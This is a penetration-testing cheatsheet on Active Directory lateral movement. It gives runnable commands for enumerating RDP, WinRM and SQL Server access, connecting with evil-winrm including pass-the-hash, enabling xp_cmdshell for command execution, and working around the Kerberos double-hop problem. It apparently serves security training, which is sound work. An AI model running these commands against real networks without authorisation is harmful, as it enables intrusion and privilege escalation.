# Lateral Movement & Privileged Access Cheatsheet
*(RDP, WinRM, MSSQL access enumeration + the Kerberos Double Hop problem you'll hit using any of them)*

---

## 1. Enumerate Remote Access Rights First

**BloodHound edges to check (fastest method):**
| Edge | Means |
|---|---|
| `CanRDP` | User/group can RDP to a host |
| `CanPSRemote` | User/group can WinRM/PSRemote to a host |
| `SQLAdmin` | User has sysadmin rights on a SQL Server instance |

**First check after importing BloodHound data, every time:** does `Domain Users` have local admin or execution rights (RDP/WinRM) over any host? That's an environment-wide misconfiguration, not a one-off.

**Pre-built BloodHound queries:** *Find Workstations where Domain Users can RDP*, *Find Servers where Domain Users can RDP*.

**Custom Cypher — find WinRM access via group membership chains:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
**Same for SQL admin rights:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
Save either as a custom query in BloodHound so it's always one click away.

**PowerView fallback (per-host, manual):**
```powershell
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"
Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"
```
`Remote Management Users` is the WinRM-without-local-admin group (exists since Server 2012).

---

## 2. RDP

**Connect:**
```bash
xfreerdp /u:<user> /p:'<pass>' /d:<domain> /v:<target_IP>
```
(or Remmina / `mstsc.exe` from a Windows attack host)

RDP access without local admin is still valuable — pillage the host, hunt for local privesc, or find cached credentials of a higher-privileged user who also logs into that box.

---

## 3. WinRM

**From Windows:**
```powershell
$password = ConvertTo-SecureString "<pass>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\<user>", $password)
Enter-PSSession -ComputerName <target> -Credential $cred
```

**From Linux — evil-winrm (still the standard tool, actively maintained):**
```bash
gem install evil-winrm
evil-winrm -i <target_IP> -u <user> -p '<pass>'
# or with a hash instead of a password:
evil-winrm -i <target_IP> -u <user> -H <NTHASH>
```

---

## 4. MSSQL (SQL Server Admin)

Common source of SQL creds: Kerberoasting (MSSQL service accounts are frequently SPN-registered and weakly-passworded), LLMNR poisoning, password spraying, or Snaffler finding `web.config`/connection strings on a share.

**Find SQL instances (Windows, PowerUpSQL):**
```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

**Query/connect (Windows):**
```powershell
Get-SQLQuery -Verbose -Instance "<IP>,1433" -username "DOMAIN\<user>" -password '<pass>' -query 'Select @@version'
```

**Connect (Linux, Impacket):**
```bash
mssqlclient.py DOMAIN/<user>@<target_IP> -windows-auth
```

**Once connected, enable OS command execution:**
```sql
enable_xp_cmdshell
xp_cmdshell whoami /priv
```
Check for `SeImpersonatePrivilege` in the output — SQL Server service accounts almost always have it, and it's a direct path to SYSTEM via JuicyPotato/PrintSpoofer/RoguePotato (separate local-privesc topic, not covered here).

**SQL Server access is close to a guaranteed SYSTEM path** once you have `xp_cmdshell` — always worth testing any SQL creds you find, even ones that look unprivileged at first glance.

---

## 5. The Kerberos "Double Hop" Problem

### What it is
Kerberos tickets aren't passwords — a WinRM/PSRemoting session only carries a TGS for the one resource you connected to. Your TGT (which is what would let that host authenticate onward to a third host, like the DC, on your behalf) is **not forwarded** by default. So PowerView or anything else that needs to reach the DC from inside your remote session fails, even though your account has the rights — because the second hop has no way to prove who you are.

**Symptom:** commands that work locally on your attack host fail from inside an `Enter-PSSession` with something like:
```
Exception calling "FindAll" with "0" argument(s): "An operations error occurred."
```
Check with `klist` inside the session — you'll see only a ticket for the current host, nothing for the DC.

**Why PSExec/password-based auth doesn't hit this:** password auth caches the NTLM hash in the session, so it can be replayed for the next hop. Kerberos never caches a password — by design.

**Natural escape hatch:** if the host has **unconstrained delegation**, the TGT gets cached there automatically and double-hop isn't an issue at all — "if you land on unconstrained delegation, you've basically already won."

### Workaround #1 — PSCredential object (works from evil-winrm or any WinRM session)
```powershell
$SecPassword = ConvertTo-SecureString '<pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<user>', $SecPassword)
Get-DomainUser -SPN -Credential $Cred | select samaccountname
```
Pass `-Credential $Cred` explicitly on every command that needs to reach the DC. Tedious, but works everywhere WinRM does, including evil-winrm.

### Workaround #2 — Register-PSSessionConfiguration (GUI/RDP access only, not evil-winrm)
From inside a session on the intermediate host:
```powershell
Register-PSSessionConfiguration -Name <name> -RunAsCredential DOMAIN\<user>
Restart-Service WinRM
```
Then reconnect using the new config:
```powershell
Enter-PSSession -ComputerName <intermediate_host> -Credential DOMAIN\<user> -ConfigurationName <name>
```
`klist` now shows cached DC tickets — the double hop is gone for this session.

**Limitations:**
- Needs GUI/RDP access to the intermediate host with an elevated PowerShell console — does **not** work from an evil-winrm session (no credential popup available).
- Does **not** work from Linux-hosted PowerShell (Kerberos ticket handling limitations on non-Windows PowerShell).
- Best suited for: Windows attack host with creds, or an RDP'd-into compromised host used as a jump box.

**Other workarounds that exist but aren't detailed here:** CredSSP, port forwarding, sacrificial-process injection (running a process in the target user's context to borrow their token).

---

## Quick priorities when you land a new set of creds
1. Check BloodHound `CanRDP`/`CanPSRemote`/`SQLAdmin` edges first — fastest path to knowing what you can actually touch.
2. If WinRM is your only access and you hit the double-hop wall, reach for Workaround #1 immediately — it's the one that works everywhere.
3. Always test any SQL creds you find, even low-privilege-looking ones — `xp_cmdshell` + `SeImpersonatePrivilege` is close to an automatic win.
4. Re-run this enumeration **every time** you gain a new account — remote access rights are per-user/per-group, so last hop's answer doesn't apply to this hop.
